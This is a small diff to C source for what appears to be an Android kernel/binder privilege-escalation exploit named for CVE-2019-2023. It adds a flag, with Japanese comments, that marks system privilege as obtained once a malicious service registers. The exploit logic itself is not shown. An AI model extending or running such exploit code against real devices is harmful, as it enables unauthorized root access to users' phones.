@@ -99,6 +99,7 @@ static uint64_t g_cred_ptr = 0;
 static int g_cred_off = -1;
 static int g_al_off = -1;
 static int g_root_achieved = 0;
+static int g_system_privilege = 0;   /* 追加: system権限フラグ */
 
 static struct {
     int cred;
@@ -201,6 +202,7 @@ static int exploit_cve_2019_2023(void) {
         return -1;
     }
     printf("  [+] Service registered successfully!\n");
+    g_system_privilege = 1;  /* system権限を獲得 */
 
     data = malloc(total_len);
     if (!data) { close(hwbinder_fd); return -1; }
